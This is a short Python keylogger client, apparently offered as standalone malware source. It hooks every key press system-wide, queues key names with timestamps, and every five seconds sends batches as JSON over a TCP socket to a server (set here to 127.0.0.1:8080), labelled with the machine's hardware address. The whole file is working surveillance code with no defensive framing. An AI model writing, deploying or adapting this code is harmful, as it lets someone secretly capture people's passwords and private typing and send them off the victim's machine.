import time

import keyboard
import threading

import json
import uuid
from queue import Queue
import socket

SERVER_ADDRESS = '127.0.0.1'
SERVER_PORT = 8080
CLIENT_DATA = uuid.getnode()


keys_pressed = Queue(maxsize=1024)


def on_key_press(event: keyboard.KeyboardEvent):
    # this has to be global
    global keys_pressed
    evn = {'name': event.name, 'time': event.time}
    keys_pressed.put(evn)


def start_keylogger():
    keyboard.on_press(callback=on_key_press)
    keyboard.wait()


def send_keys():
    global keys_pressed
    while threading.main_thread().is_alive():
        new_keys = []
        while not keys_pressed.empty():
            if not len(new_keys) > 100:
                new_keys.append(keys_pressed.get())

        if new_keys:
            print('connector')
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_ADDRESS, SERVER_PORT))
            send_info = json.dumps({'host': CLIENT_DATA, 'keys': new_keys})
            client_socket.send(send_info.encode())
            print('closing')
            client_socket.close()
        time.sleep(5)


if __name__ == '__main__':
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
    sender_thread = threading.Thread(target=send_keys)
    sender_thread.start()

    keylogger_thread.join()
    sender_thread.join()
